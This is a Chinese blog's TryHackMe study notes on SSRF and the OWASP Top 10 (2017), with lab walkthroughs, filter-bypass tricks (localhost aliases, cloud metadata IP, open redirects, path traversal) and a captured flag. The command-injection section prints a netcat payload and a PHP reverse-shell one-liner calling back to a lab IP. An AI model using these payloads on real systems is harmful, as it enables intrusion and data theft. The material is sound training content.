<p>选中有效记录修改并重新发送：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003223722040.png"
                      alt="image-20221003223722040"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003223516515.png"
                      alt="image-20221003223516515"
                ></p>
<p>双击有效记录，进入对应的页面并直接修改url：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003223856699.png"
                      alt="image-20221003223856699"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003223611587.png"
                      alt="image-20221003223611587"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221003221723685.png"
                      alt="image-20221003221723685"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Intro to SSRF(服务器端请求伪造漏洞简介)-学习</title>
    <url>/2024/01/27/THM-Intro%20to%20SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/ssrfqi" >https://tryhackme.com/room/ssrfqi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解如何利用服务器端请求伪造 (SSRF：Server-Side Request Forgery) 漏洞，从而允许你访问服务器内部资源。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，你将了解什么是 SSRF，它们会产生什么样的影响，你可以看到一些 SSRF 攻击示例，了解如何发现 SSRF 漏洞，如何规避输入规则限制。</p>
<p><strong>什么是SSRF?</strong></p>
<p>首先要知道目标web服务器可以向其他web服务器或子域站点发出资源请求消息。SSRF代表服务器端请求伪造（Server-Side Request Forgery），是一个针对服务器端请求的漏洞：允许恶意用户操纵目标web服务器 基于攻击者所选择的资源信息发出额外的或编辑过的 HTTP 请求。</p>
<p><strong>SSRF 的种类</strong></p>
<p>有两种类型的 SSRF 漏洞：第一个是常规的 SSRF，完成攻击之后，数据会返回到攻击者的屏幕；第二种是 盲SSRF 漏洞，能完成SSRF攻击，但没有任何信息会返回到攻击者的屏幕。</p>
<p><strong>有什么影响？</strong></p>
<p>成功的 SSRF 攻击可能导致以下任何情况：</p>
<ul>
<li>能访问到未经授权的区域。</li>
<li>能访问客户&#x2F;组织数据。</li>
<li>能够扩展到内部网络。</li>
<li>能够获取到身份验证令牌&#x2F;凭据。</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122181615833.png"
                      alt="image-20221122181615833"
                ></p>
<h2 id="SSRF示例"><a href="#SSRF示例" class="headerlink" title="SSRF示例"></a>SSRF示例</h2><p><strong>示例</strong></p>
<p>我们将带你了解一些 SSRF 攻击示例并解释它们的工作原理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122181906008.png"
                      alt="image-20221122181906008"
                ></p>
<p>下面的示例显示了攻击者如何完全控制 Web 服务器请求的页面。预期请求是 website.thm 服务器期望接收的内容，红色部分是网站用于获取其他资源信息的 URL。<br>攻击者可以将红色区域修改为他们自己所选择的 URL。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122182012007.png"
                      alt="image-20221122182012007"
                ></p>
<p>下面的示例显示了攻击者如何仅通过利用目录遍历来控制路径以到达 <code>/api/user</code> 页面。 当 website.thm 收到 <code>../</code> 时，会向上移动一级目录，这将移除原本所请求的<code>/stock</code>部分并将最终请求变成<code>/api/user</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122183411267.png"
                      alt="image-20221122183411267"
                ></p>
<p>在下面的示例中，攻击者可以控制发出请求的服务器的子域。 请注意以 <code>&amp;x=</code> 结尾的payload可用于阻止将剩余路径附加到攻击者所构造的 URL 的末尾，这能将剩余路径转换为查询字符串中的参数 (<code>?x=</code>)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122184122896.png"
                      alt="image-20221122184122896"
                ></p>
<p>回到最初的示例，攻击者还可以尝试强制目标web服务器发出请求来包含攻击者所选择的服务器。完成相关操作之后，我们就可以捕获 由目标web服务器发送到攻击者指定域的请求标头，这些标头可能包含由 website.thm 发送的身份验证凭据或 API 密钥（假设此例中的目标服务器通常会向 api.website.thm 进行身份验证）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122184751593.png"
                      alt="image-20221122184751593"
                ></p>
<p>尝试更改以下浏览器中的地址，强制目标web服务器基于子域<code>https://server.website.thm/flag?id=9</code>页面返回数据（为了使事情变得更容易，模拟浏览器底部的服务器请求栏将显示 website.thm 所请求的 URL）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122190335179.png"
                      alt="image-20221122190335179"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122191436498.png"
                      alt="image-20221122191436498"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122181750179.png"
                      alt="image-20221122181750179"
                ></p>
<p>提示：附加 &amp;x&#x3D; 以忽略 URL 的剩余部分。</p>
<p>操作：见本节的示例部分。</p>
<h2 id="找到SSRF漏洞"><a href="#找到SSRF漏洞" class="headerlink" title="找到SSRF漏洞"></a>找到SSRF漏洞</h2><p>可以通过许多不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞，以下是关于四个存在SSRF漏洞的常见位置的示例。</p>
<p>在浏览器地址栏的http(s)请求参数中使用完整 URL ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122191919887.png"
                      alt="image-20221122191919887"
                ></p>
<p>修改表单中的隐藏字段：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122192125765.png"
                      alt="image-20221122192125765"
                ></p>
<p>修改部分 URL，例如子域的hostname：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122192215177.png"
                      alt="image-20221122192215177"
                ></p>
<p>修改URL 的访问路径：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122192336790.png"
                      alt="image-20221122192336790"
                ></p>
<p>其中一些示例比其他示例更容易被利用，在实际环境下，我们往往需要经过大量试验和错误才能找到payload的生效位置。</p>
<p>如果执行的 SSRF 攻击是没有输出的 盲SSRF 类型，你还需要使用外部 HTTP 日志记录工具来监视http请求消息，例如 <code>requestbin.com</code>、你自己的 HTTP 服务器或 BurpSuite 的 <code>Collaborator</code> 客户端。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122192934797.png"
                      alt="image-20221122192934797"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122193105339.png"
                      alt="image-20221122193105339"
                ></p>
<blockquote>
<p><a class="link"   href="https://requestbin.com/" >https://requestbin.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="绕过常见的SSRF防御"><a href="#绕过常见的SSRF防御" class="headerlink" title="绕过常见的SSRF防御"></a>绕过常见的SSRF防御</h2><p>了解 SSRF 漏洞风险的开发人员可能会在其应用程序中实施SSRF漏洞检查，以确保服务器所请求的资源符合特定规则。 防御SSRF通常有两种方法：建立拒绝列表、建立允许列表。</p>
<p><strong>Deny List</strong></p>
<p>建立拒绝列表之后，除了拒绝列表中指定的资源或者与列表特定模式（即规则）匹配的资源之外的所有请求都会被目标web服务器接受。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域 不被公众随意访问，同时该列表将仍然允许公众访问web服务器的其他资源。限制访问的特定端点可以是<code>localhost</code>，因为它可能包含服务器性能数据或其他敏感信息，因此 <code>localhost</code> 和 <code>127.0.0.1</code> 等域名将出现在拒绝列表中。</p>
<p>攻击者可以通过使用其他 localhost 引用来绕过（bypass）拒绝列表，例如使用 <code>0</code>、<code>0.0.0.0</code>、<code>0000</code>、<code>127.1</code>、<code>127.*.*.*</code>、<code>2130706433</code>、<code>017700000001 </code>或者使用具有解析为 IP 地址<code>127.0.0.1</code>的 DNS 记录的子域如<code>127.0.0.1.nip.io</code>等。</p>
<p>此外，在云环境中，阻止对IP地址<code>169.254.169.254</code>的访问将是有益的，因为该地址包含已部署的云服务器的元数据，而元数据可能包括一些敏感信息。 攻击者可以通过在自己的域上注册一个子域来绕过此防御，将该注册子域的 DNS 记录指向 IP 地址<code>169.254.169.254</code>即可。</p>
<p><strong>Allow List</strong></p>
<p>允许列表能用于拒绝其他任何请求，除非该请求出现在允许列表中或者能匹配允许列表所规定的特定模式（规则），例如http(s)请求参数中使用的 URL 必须以<em><strong><a class="link"   href="https://website.thm/" >https://website.thm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></em>开头的规则。 </p>
<p>攻击者可以通过在自己所拥有的域名上创建一个子域来快速规避前面提到的规则，例如创建子域<em><strong><a class="link"   href="https://website.thm.attackers-domain.thm/" >https://website.thm.attackers-domain.thm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></em>之后，web应用程序的逻辑将允许此子域url输入并能让攻击者控制目标web服务器的内部 HTTP 请求。</p>
<p><strong>Open Redirect（开放重定向）</strong></p>
<p>如果上述绕过方法不起作用，攻击者还可以使用另一种技巧，即开放重定向。开放重定向是目标web服务器上的端点，目标网站访问者可以通过该端点自动重定向到另一个网站地址。</p>
<p>以链接 <a class="link"   href="https://website.thm/link?url=https://tryhackme.com" >https://website.thm/link?url=https://tryhackme.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例，创建此端点是为了记录网站访问者出于广告&#x2F;营销目的而点击相关页面链接的次数。但想象一下，如果目标站点具有严格的规则，只允许以 <a class="link"   href="https://website.thm/" >https://website.thm/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 开头的 URL，那么就可能存在一个潜在的SSRF漏洞，因为攻击者可以尝试利用开放重定向功能将目标web服务器的内部 HTTP 请求重定向到攻击者所选择的域。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122201807760.png"
                      alt="image-20221122201807760"
                ></p>
<h2 id="SSRF练习"><a href="#SSRF练习" class="headerlink" title="SSRF练习"></a>SSRF练习</h2><p>让我们在一个虚构的场景中测试我们学到的关于 SSRF 的知识。</p>
<p>假设在针对 Acme IT Support 网站（目标示例站点）的内容发现练习中，我们遇到了两个新端点。第一个是 <code>/private</code>，它给我们提供了一条错误消息，说明无法从我们的当前 IP 地址查看private页面内容；第二个是位于 <code>/customers/new-account-page</code> 的新版本客户帐户页面，此页面具有允许客户为其帐户选择头像的新功能。</p>
<p>首先单击该小节所对应的TryHackMe实验房间中的 Start Machine 按钮以启动 Acme IT Support 网站（目标站点）。当目标站点运行后，通过攻击机访问刷新之后的URL <a class="link"   href="https://lab_web_url.p.thmlabs.com/" >https://LAB_WEB_URL.p.thmlabs.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 即可，然后按照以下说明获取flag。</p>
<p>创建一个客户帐户并登录。登录后，立即访问 <a class="link"   href="https://lab_web_url.p.thmlabs.com/customers/new-account-page" >https://LAB_WEB_URL.p.thmlabs.com/customers/new-account-page <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面查看新头像选择功能。通过查看头像表单的页面源代码，你会看到头像(avatar)表单字段值中包含了图像的路径；根据下面的屏幕截图，在DIV 元素中，能找到背景图像样式（style）以证实这一点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122232950768.png"
                      alt="image-20221122232950768"
                ></p>
<p>如果你选择其中一个头像，然后单击“更新头像”（ <strong>Update Avatar</strong> ）按钮，你将看到表单发生变化，在其上方会显示你当前所选择的头像。查看页面源代码将显示当前头像所对应的 URI 数据方案（data URI scheme）详情，图像内容将按照下面的屏幕截图进行 base64 编码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122233422846.png"
                      alt="image-20221122233422846"
                ></p>
<p>现在让我们再次尝试发出请求，但此次将 <code>avatar</code> 值更改为 <code>private</code>，以期望目标web服务器允许我们通过当前 IP 地址块来访问<code>private</code>所对应的资源。 为此，首先，右键单击头像表单上的其中一个单选按钮并选择“Inspect”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122234133035.png"
                      alt="image-20221122234133035"
                ></p>
<p>然后将单选按钮的值编辑为<code>private</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122234231260.png"
                      alt="image-20221122234231260"
                ></p>
<p>然后单击“更新头像”（ <strong>Update Avatar</strong> ）按钮。 不幸的是，Web 应用程序似乎设置了一个拒绝列表，阻止了我们对 <code>/private</code>端点的访问：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122234342148.png"
                      alt="image-20221122234342148"
                ></p>
<p>正如你从上图的错误消息中看到的那样，路径不能以<code>/private</code>开头，但请放心，我们仍然有办法绕过此规则。 我们可以使用目录遍历技巧来到达我们想要的端点：尝试将刚才的头像（avatar ）值设置为 <code>x/../private</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122234533785.png"
                      alt="image-20221122234533785"
                ></p>
<p>我们现在绕过了规则限制，用户能够成功更新头像。 这个技巧之所以有效，是因为当目标Web服务器接收到关于 <code>x/../private</code> 的请求时，它知道<code>../</code>字符串意味着向上移动一级目录，该级目录能够将访问请求成功转换为<code>/private</code>。</p>
<p>查看头像表单的页面源码，你会看到当前设置的头像能够包含经过base64编码的<code>/private</code>目录下的内容，对这些内容进行解码，就能得到该练习所对应的flag。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221122235137643.png"
                      alt="image-20221122235137643"
                ></p>
<p>启动目标机器，使用攻击机访问目标站点：<a class="link"   href="https://10-10-137-108.p.thmlabs.com/" >https://10-10-137-108.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123153200165.png"
                      alt="image-20221123153200165"
                ></p>
<p>登录刚才创建的账户，访问以下页面：<a class="link"   href="https://10-10-137-108.p.thmlabs.com/customers/new-account-page" >https://10-10-137-108.p.thmlabs.com/customers/new-account-page <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123153538989.png"
                      alt="image-20221123153538989"
                ></p>
<p>查看头像表单的页面源代码，能够看到头像(avatar)表单字段值对应着图像的url资源路径（观察下图中的两个红色小框）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123154132833.png"
                      alt="image-20221123154132833"
                ></p>
<p>选中头像表单中的一个头像，然后单击“更新头像”（ <strong>Update Avatar</strong> ）按钮，你将看到表单发生变化，在其上方会显示你当前所选择的头像。查看当前页面源代码将显示 当前头像 所对应的 URI 数据方案（data URI scheme）详情，可以得知图像内容将进行 base64 编码处理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123154537594.png"
                      alt="image-20221123154537594"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123154446941.png"
                      alt="image-20221123154446941"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155719996.png"
                      alt="image-20221123155719996"
                ></p>
<p>现在让我们再次尝试发出请求，但此次将 <code>avatar</code> 值更改为 <code>private</code>，以期望目标web服务器允许我们通过当前 IP 地址块来访问<code>private</code>所对应的资源。 为此，首先，右键单击头像表单上的其中一个单选按钮并选择“Inspect”：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155217011.png"
                      alt="image-20221123155217011"
                ></p>
<p>然后将单选按钮的值编辑为<code>x/../private</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155413476.png"
                      alt="image-20221123155413476"
                ></p>
<p>然后单击“更新头像”（ <strong>Update Avatar</strong> ）按钮，接着查看头像表单的页面源码，你会看到当前设置的头像能够包含经过base64编码的<code>/private</code>目录下的内容，对这些内容进行解码，得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155538163.png"
                      alt="image-20221123155538163"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155627033.png"
                      alt="image-20221123155627033"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221123155900323.png"
                      alt="image-20221123155900323"
                ></p>
<blockquote>
<p>base64码：VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ&#x3D;&#x3D;</p>
<p>解码：THM{YOU_WORKED_OUT_THE_SSRF}</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-OWASP Top10(2017版)-学习</title>
    <url>/2024/01/27/THM-OWASP%20Top%2010(2017%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/owasptop10" >https://tryhackme.com/room/owasptop10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解并利用每个OWASP Top 10漏洞，它们是十大最严重的Web安全风险。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129220611499.png"
                      alt="image-20221129220611499"
                ></p>
<p>本文知识点是为初学者而设计的，假设阅读本文的人员之前没有接触过任何安全相关知识。</p>
<p>本文所涉及的知识点如下(相关的知识点只是基础知识点，如果你想深入了解OWASP TOP 10或者进行web漏洞挖掘工作，那么你还需要进一步的学习和练习)：</p>
<ul>
<li>Injection（注入漏洞）</li>
<li>Broken Authentication（存在缺陷的身份验证机制）</li>
<li>Sensitive Data Exposure（敏感信息泄露）</li>
<li>XML External Entity（XML外部实体注入-XXE漏洞）</li>
<li>Broken Access Control（存在缺陷的访问控制机制）</li>
<li>Security Misconfiguration（安全性配置错误）</li>
<li>Cross-site Scripting（跨站脚本漏洞-XSS漏洞）</li>
<li><strong>I</strong>nsecure Deserialization（不安全的反序列化-反序列化漏洞）</li>
<li>Components with Known Vulnerabilities（具有已知漏洞的组件）</li>
<li>Insufficent Logging &amp; Monitoring（日志记录和监控不足）</li>
</ul>
<p><em><strong>本文使用的是OWASP TOP 10的2017年标准</strong></em>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205235710045.png"
                      alt="image-20221205235710045"
                ></p>
<blockquote>
<p>关于OWASP-TOP10的介绍：<a class="link"   href="https://www.safedog.cn/news/5092.html" >https://www.safedog.cn/news/5092.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="严重程度TOP1-注入"><a href="#严重程度TOP1-注入" class="headerlink" title="[严重程度TOP1] 注入"></a>[严重程度TOP1] 注入</h2><p>注入漏洞在当今的应用中非常普遍，之所以出现这些漏洞 是因为web应用程序会将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前web应用程序正在使用的技术以及这些技术会如何准确解释用户所输入的数据，一些常见的例子包括:</p>
<ul>
<li>SQL注入:当用户控制的输入数据被传递给后端的SQL查询语句时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为并获取到相关查询结果。</li>
<li>命令注入:当用户的输入被传递成为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在web应用服务器上执行任意的系统命令。</li>
</ul>
<p>如果攻击者能够成功地传递一些 会被web应用程序正确解释的输入数据，他们将能够做以下事情:</p>
<ul>
<li>当用户输入能被传递到数据库查询时，攻击者可以访问、修改和删除数据库中的数据信息；这意味着攻击者可以窃取个人详细信息和用户凭证等敏感信息。</li>
<li>攻击者可以在目标服务器上执行任意系统命令，这将允许攻击者访问 服务器用户所对应的权限级别下 的系统文件；然后攻击者就能够窃取敏感数据，并能对与 执行恶意命令的服务器 相链接的基础设施进行更多攻击。</li>
</ul>
<p>防止注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为查询语句或有效命令，有几种不同的方法:</p>
<ul>
<li>使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或字符列表进行比较。如果用户所提供的输入数据被标记为安全的，那么它将被允许通过；否则，用户所提供的输入数据将被拒绝通过，应用程序此时也将抛出一个错误提示。</li>
<li>过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么应用程序会首先将这些危险字符清除，然后再继续进行处理。</li>
</ul>
<p>危险字符或危险输入会被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表或仅仅清除输入数据之外，还有各种函数库可以帮助你执行防注入操作。</p>
<h2 id="严重程度TOP1-操作系统命令注入"><a href="#严重程度TOP1-操作系统命令注入" class="headerlink" title="[严重程度TOP1] 操作系统命令注入"></a>[严重程度TOP1] 操作系统命令注入</h2><p>当web应用程序中的服务器端代码(如PHP代码)在宿主机上进行系统调用时，就可能会发生命令注入，这是一个web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上执行任意操作系统命令。</p>
<p>有时，命令注入并不总是恶意的，比如执行 <em><strong>whoami</strong></em> 命令或者简单地执行 <em><strong>读取文件</strong></em> 命令；但是命令注入漏洞能为攻击者提供很多选择以进行漏洞利用，攻击者所能做的最糟糕的事情是利用命令注入漏洞来产生一个反向shell，并获得web服务器运行时所对应的用户权限。</p>
<p>通过简单地执行payload <code>;nc -e /bin/bash</code>就可能获得目标web服务器的权限（注意：一些netcat命令的变体也可能不支持-e选项），你可以使用以下反向shell列表以及在线生成器作为替代方案：</p>
<blockquote>
<p><a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.revshells.com/" >https://www.revshells.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>一旦攻击者在web服务器上获得立足点，他们就可以开始对目标操作系统进行常见的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。</p>
<h2 id="严重程度TOP1-命令注入-练习"><a href="#严重程度TOP1-命令注入-练习" class="headerlink" title="[严重程度TOP1] 命令注入-练习"></a>[严重程度TOP1] 命令注入-练习</h2><p><strong>什么是主动命令注入？</strong></p>
<p>当向服务器发出的系统命令未在 HTML 文档中给攻击者返回响应消息时，发生的可能是盲注类型的命令注入；而在主动命令注入攻击中，攻击者将收到对应的响应消息，目标站点可以通过多个 HTML 元素使响应消息对攻击者可见。</p>
<p>让我们考虑一个场景：攻击者正在尝试建立基于 Web 的shell，但不小心将其暴露在 Internet 上，它还未完成，但如果目标网站存在命令注入漏洞，那么攻击者就可以利用该shell 并在目标网站的当前页面上看到来自系统调用的响应消息。</p>
<p>让我们看看 evilshell.php 中的示例代码，看看它在做什么，以及为什么它会激活命令注入。</p>
<p><em><strong>EvilShell (evilshell.php) Code Example</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221201174453578.png"
                      alt="image-20221201174453578"
                ></p>
<p>查看伪代码，上面的代码片段会执行以下操作：</p>
<ol>
<li>检查是否设置了参数“<em>commandString</em>”。</li>
<li>如果设置了，则变量 <code>$command_string</code> 将获取传递到用户输入字段中的内容。</li>
<li>然后程序将进入 try 块以执行函数<code>passthru($command_string)</code>。 你可以阅读有关<a class="link"   href="https://www.php.net/manual/en/function.passthru.php" >passthru() 的文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，它会执行对应变量所传递的内容，然后将输出结果直接传递回浏览器中的网站相关页面。</li>
<li>如果 try 执行不成功，那么 catch 应该将错误消息输出到当前页面，但是这通常不会显示任何东西，因为在此处无法直接输出stderr(标准错误输出)，添加catch是因为PHP不允许我们在没有使用 catch 的情况下单独执行 try 。</li>
</ol>
<p><strong>检测主动命令注入的方法</strong></p>
<p>当你可以看到系统调用的响应消息时，就说明发生了主动命令注入。在上面的代码中，函数<code>passthru()</code>会将响应消息直接传递给HTML文档，因此你可以在相关网页中看到你的命令注入payload的执行效果；正是因为基于这一点，所以我们可以通过输入一些有用的命令来尝试进一步枚举目标信息。对 <code>passthru()</code> 的函数调用可能并不总是在屏幕后发生，以上示例只是一个用来演示命令注入漏洞的简单方法。</p>
<p><strong>可尝试执行的命令</strong></p>
<p><strong>Linux</strong></p>
<ul>
<li>whoami</li>
<li>id</li>
<li>ifconfig&#x2F;ip addr</li>
<li>uname -a</li>
<li>ps -ef</li>
</ul>
<p><strong>Windows</strong></p>
<ul>
<li>whoami</li>
<li>ver</li>
<li>ipconfig</li>
<li>tasklist</li>
<li>netstat -an</li>
</ul>
<p>请导航至 <a class="link"   href="http://machine_ip/evilshell.php" >http://MACHINE_IP/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，以完成相关问题。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221201191620410.png"
                      alt="image-20221201191620410"
                ></p>
<p>tips：MOTD-每日提示-message of the day</p>
<p>启动目标机，在攻击机的浏览器中访问 <a class="link"   href="http://10.10.163.228/evilshell.php" >http://10.10.163.228/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在攻击机上设置netcat监听器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184144289.png"
                      alt="image-20221203184144289"
                ></p>
<p>在<a class="link"   href="http://10.10.163.228/evilshell.php" >http://10.10.163.228/evilshell.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面使用反向shell命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.14.32.186&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">反向shell备忘录：https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184256414.png"
                      alt="image-20221203184256414"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184333130.png"
                      alt="image-20221203184333130"
                ></p>
<p><em><strong>通过攻击机的反向shell界面执行命令</strong></em></p>
<p>使用<code>ls</code>命令：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184423876.png"
                      alt="image-20221203184423876"
                ></p>
<p>使用<code>cat /etc/passwd</code>命令（查看non-root&#x2F;non-service&#x2F;non-daemon用户数目）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184654131.png"
                      alt="image-20221203184654131"
                ></p>
<p>使用<code>whoami</code>命令（查看当前用户名）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184721887.png"
                      alt="image-20221203184721887"
                ></p>
<p>使用<code>cat /etc/passwd</code>命令（查看当前用户名所对应的shell设置）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203184953287.png"
                      alt="image-20221203184953287"
                ></p>
<p>使用<code>cat /etc/os-release</code>命令（查看操作系统版本）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203185142815.png"
                      alt="image-20221203185142815"
                ></p>
<p>使用<code>cat /etc/update-motd.d/00-header</code>命令查看MOTD（message of the day-每日提示）中的隐藏信息：</p>
<p>tips：<code>ls /etc/update-motd.d</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203185553421.png"
                      alt="image-20221203185553421"
                ></p>
